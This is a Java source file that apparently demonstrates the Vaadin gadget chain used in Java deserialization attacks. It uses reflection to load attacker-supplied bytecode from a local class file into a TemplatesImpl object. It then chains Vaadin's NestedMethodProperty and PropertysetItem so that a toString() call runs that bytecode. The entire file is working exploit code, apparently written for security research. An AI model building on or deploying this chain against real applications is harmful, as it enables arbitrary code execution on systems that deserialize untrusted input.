import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Vaadin {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        TemplatesImpl templates = new TemplatesImpl();
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\CalcAbs.class"));
        setFieldValue(templates, "_name", "useless");
        setFieldValue(templates, "_tfactory",  new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][] {bytes});
        setFieldValue(templates, "_class", null);


        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object>(templates, "outputProperties");
        PropertysetItem propertysetItem = new PropertysetItem();
        propertysetItem.addItemProperty("outputProperties", nmprop);

        propertysetItem.toString();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Class<?> aClass = obj.getClass();
        Field field = null;
        while (aClass != null) {
            try {
                field = aClass.getDeclaredField(fieldName);
                break;
            }catch (NoSuchFieldException e) {
                aClass = aClass.getSuperclass();
            }
        }
        field.setAccessible(true);
        field.set(obj, value);
    }
}
